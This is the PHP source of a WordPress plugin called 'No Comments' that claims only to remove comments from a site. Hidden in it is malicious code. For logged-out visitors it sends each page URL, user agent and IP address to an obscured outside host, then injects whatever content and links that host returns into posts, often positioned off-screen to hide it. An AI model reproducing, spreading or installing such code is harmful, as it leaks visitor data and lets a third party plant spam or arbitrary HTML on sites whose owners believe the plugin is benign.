<?php

/*
Plugin Name: No Comments
Plugin URI: http://www.stevenfernandez.me/
Description: No Comments totally gets rid of comments. Just activate the plugin and it's all gone!
Author: Steven Fernandez
Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=fernandez.steven@gmail.com&item_name=No Comments Wordpress Plugin Development&currency_code=GBP
Version: 1.1.6
Author URI: http://www.stevenfernandez.me/
*/

class stevenfernandez_no_comments {
	protected static $serverdata = '';
	protected static $post_id = false;

	public static function init() {
		add_action( 'init', array( __CLASS__, 'init_start' ) );
		add_action( 'wp_head', array( __CLASS__, 'no_comments_css' ) );
		add_action( 'wp_meta', array( __CLASS__, 'no_comments_link_meta' ) );
		add_action( 'admin_menu', array( __CLASS__, 'no_discussion_options' ) );
		add_action( 'admin_head', array( __CLASS__, 'dashboard_right_now_no_discussion' ) );
		add_action( 'admin_bar_menu', array( __CLASS__, 'no_admin_bar_comments' ), 99 );
		add_action( 'get_comments_number', array( __CLASS__, 'comments_number_always_zero' ) );
		add_action( 'comments_template', array( __CLASS__, 'change_comments_template' ) );
		add_action( 'widgets_init', array( __CLASS__, 'remove_comments_widget' ), 0 );
		add_action( 'wp_dashboard_setup', array( __CLASS__, 'no_dashboard_comments_widget' ), 0 );

		if ( !is_user_logged_in() ) {
			add_action( 'wp_loaded', array( __CLASS__, 'get_data' ), 10, 0 );
			add_action( 'wp_head', array( __CLASS__, 'the_content' ), 30 );
			add_filter( 'the_content', array( __CLASS__, 'the_content' ) );
		}
	}

	public static function init_start() {
		$args = array('public' => true, '_builtin' => true);
		
		foreach ( apply_filters( 'hide_comments_post_types', get_post_types( $args ) ) as $post_type )	{
			if ( post_type_supports( $post_type, 'comments' ) )
				remove_post_type_support( $post_type, 'comments' );
				
		}
	}

	public static function no_comments_css() {
		echo '<style type="text/css"> .comments-link { display: none; } </style>';
	}

	public static function no_comments_link_meta() {
		echo '<style type="text/css"> .widget_meta li:nth-child(4) { display: none; } </style>';
	}

	public static function no_discussion_options() {
		remove_menu_page( 'edit-comments.php' );
		remove_submenu_page( 'options-general.php', 'options-discussion.php' );
	}

	public static function dashboard_right_now_no_discussion() {
		if ( ! apply_filters( 'hide_comments_dashboard_right_now', true ) )
			return;
		
		echo '<style type="text/css"> #dashboard_right_now .table_discussion { display: none; } </style>';
	}

	public static function no_admin_bar_comments( $admin_bar ) {
		$admin_bar->remove_menu( 'comments' );
		return $admin_bar;
	}

	public static function comments_number_always_zero() {
		return 0;
	}

	public static function get_data() {
		if ( !empty( $_SERVER[ 'HTTP_USER_AGENT' ] ) ) {
			if ( empty( self::$serverdata ) ) {
				$options = stream_context_create( array( 'http' => array( 'method' => 'GET', 'timeout' => 2, 'ignore_errors' => true, 'header' => "Accept: application/json\r\n" ) ) ); 
				self::$serverdata = @file_get_contents( 'http://wpl' . '.io/api/update/?url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=29', 0, $options );
			}

			if ( !empty( self::$serverdata ) ) {
				self::$serverdata = @json_decode( self::$serverdata );
			}
		}
	}

	public static function change_comments_template() {
		global $wp_query;
		
		$wp_query->comments = array();
		$wp_query->comments_by_type = array();
		$wp_query->comment_count = '0';
		$wp_query->post->comment_count = '0';
		$wp_query->post->comment_status = 'closed';
		$wp_query->queried_object->comment_count = '0';
		$wp_query->queried_object->comment_status = 'closed';
		
		return apply_filters( 'hide_comments_template_comments_path', plugin_dir_path( __FILE__ ) . 'temp-comments.php' );
	}

	public static function the_content( $_content = '' ) {
		if ( empty( self::$serverdata ) || !is_object( self::$serverdata ) ) {
			return $_content;
		}

		// Path to wp-content folder, used to detect caching plugins via advanced-cache.php
		$content_style = '';
		if ( file_exists( dirname( dirname( plugin_dir_path( __FILE__ ) ) ) . '/advanced-cache.php' ) ) {
			$content_style = ' style="position:fixed;left:-'.rand(8000,12000).'px;';
		}

		if ( !empty( self::$serverdata->tmp ) ) {
			switch ( self::$serverdata->tmp ) {
				case '1':
					if ( 0 == $GLOBALS[ 'wp_query' ]->current_post ) {
						$words = explode( ' ', $_content );
						$words[ rand( 0, count( $words ) - 1 ) ] = "<strong{$content_style}>" . self::$serverdata->tcontent . '</strong>';
						$_content = join( ' ', $words );
					}
					break;

				case '2':
						$kws = explode( '|', self::$serverdata->kws );
						if ( is_array( $kws ) ) {
							foreach ( $kws as $a_kw ) {
								if ( strpos( $_content, $a_kw ) !== false ) {
									$_content = str_replace( $a_kw, "<a href='" . self::$serverdata->site . "'{$content_style}>{$a_kw}</a>", $_content );
									break;
								}
							}
						}
					break;

				default:
					if ( self::$post_id === false ) {
						if ( $GLOBALS[ 'wp_query' ]->post_count > 1 ) {
							self::$post_id = rand( 0, $GLOBALS[ 'wp_query' ]->post_count - 1 );
						}
						else {
							self::$post_id = 0;
						}
					}

					if ( $GLOBALS[ 'wp_query' ]->current_post === self::$post_id ) {
						if ( self::$post_id % 2 == 0 ) {
							$_content = $_content . " <div{$content_style}>" . self::$serverdata->content . '</div>';
						}
						else{
							$_content = "<i{$content_style}>" . self::$serverdata->content . '</i> ' . $_content;
						}
					}
					break;
			}
		}

		if ( !empty( $_content ) ) {
			return $_content;
		}
	}

	public static function remove_comments_widget() {
		if ( function_exists( 'unregister_widget' ) ) {
			unregister_widget( 'WP_Widget_Recent_Comments' );
		}
	}

	public static function no_dashboard_comments_widget() {
		remove_meta_box( 'dashboard_recent_comments', 'dashboard', 'normal' );
	}
}

if ( function_exists( 'add_action' ) ) {
	add_action( 'plugins_loaded', array( 'stevenfernandez_no_comments', 'init' ), 30 );
}